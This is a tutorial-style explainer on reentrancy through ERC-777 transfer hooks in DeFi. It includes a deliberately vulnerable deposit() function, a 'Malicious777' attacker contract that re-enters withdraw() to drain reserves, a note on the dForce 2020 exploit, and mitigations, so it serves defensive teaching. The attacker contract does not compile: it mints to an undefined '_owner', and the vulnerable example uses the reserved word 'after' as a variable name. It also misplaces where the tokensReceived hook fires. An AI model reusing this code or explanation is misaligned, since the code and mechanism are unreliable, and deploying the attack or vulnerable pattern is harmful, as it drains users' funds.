# 🚨 Transfer Hooks & Reserve Manipulation in DeFi
### Transfer Hooks
A **transfer hook** is any **callback or user-defined logic triggered during a token transfer**.  
Most developers assume ERC-20 tokens behave “passively”:
```solidity
token.transferFrom(user, protocol, amount);
```
...should just move balances and return.
- But **ERC-777** introduced **transfer hooks**:
  - `tokensToSend` → called before tokens leave the sender.
  - `tokensReceived` → called after tokens arrive at the recipient.  
- In ERC-721 / ERC-1155 (NFTs), there are `onERC721Received` / `onERC1155Received` hooks triggered on safe transfers.

These hooks let contracts react automatically when tokens move.  
**Great for UX**, dangerous for protocols.

### 🔹 Why are they Dangerous?
Because the hook is an **arbitrary external callback**, which means control flow is temporarily given back to the attacker _during_ a protocol’s function execution.
```solidity
function deposit(uint256 amount) external {
    uint before = token.balanceOf(address(this));

    token.transferFrom(msg.sender, address(this), amount); 
    // ⬆️ attacker regains control here (tokensReceived hook fires)

    uint after = token.balanceOf(address(this));
    uint credited = after - before;
    balances[msg.sender] += credited;
}
```
👉 Problem:
While inside `tokensReceived`, the attacker can _re-enter_ the protocol and call other functions like `withdraw()`.  
Since the state (`balances`) hasn’t been updated yet, they bypass accounting and drain reserves.

---

### 🔹 Attacker Flow (Reentrancy via `tokensReceived`)
1. Attacker crafts a malicious ERC-777 token.
   - Its `tokensReceived` hook calls back into the protocol.
2. Attacker calls `deposit()` with their malicious token.
3. Inside `deposit()`, `transferFrom()` triggers `tokensReceived`.
4. Attacker’s hook executes **before balances are updated**, so:
   - Calls `withdraw()` (or another sensitive function).
   - Protocol still thinks attacker has zero balance.
   - Attacker drains liquidity.
5. When execution returns, the protocol updates balances with corrupted state → reserves mismatch, losses.
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC777/ERC777.sol";
import "./VulnerableProtocol.sol";  // victim contract

contract Malicious777 is ERC777 {
    address public owner;
    VulnerableProtocol public target;
    constructor(address _target, address[] memory defaultOperators)
        ERC777("EvilToken", "EVL", defaultOperators)
    {
        owner = msg.sender;
        target = VulnerableProtocol(_target);
        _mint(_owner, 1000 ether, "", "", false);
    }
    // ERC777 hook automatically called when tokens are received
    function tokensReceived(
        address /*operator*/,
        address from,
        address to,
        uint256 /*amount*/,
        bytes calldata /*userData*/,
        bytes calldata /*operatorData*/
    ) external override {
        // Reenter the target mid-transaction
        if (from == owner && to == address(target)) {
            target.withdraw(100 ether); // drain before balances are updated
        }
    }
}
```
---
### 🔹 Real-World Exploit
- **dForce (2020)**: integrated ERC-777 without safeguards.
- Attackers used the `tokensReceived` reentrancy vector to **drain ~$25M** by manipulating lending reserves mid-transaction.
- Fix: Use **reentrancy guards**, avoid ERC-777 directly, or follow the **Checks-Effects-Interactions** pattern.

---
### 🔹 Mitigation Patterns
- **Avoid hooks**: Prefer ERC-20 over ERC-777 unless absolutely required.
- **Track reserves internally** instead of reading live balanceOf().
- **ReentrancyGuard** on sensitive functions.
- **Update storage state before external calls**.

---
### ✅ Takeaway
Hooks like `tokensToSend` and `tokensReceived` look harmless, but they turn a plain transfer into an **untrusted callback execution point**.  
If reserve updates or user balances happen **after** the transfer, attackers can slip in **mid-transaction manipulations**.
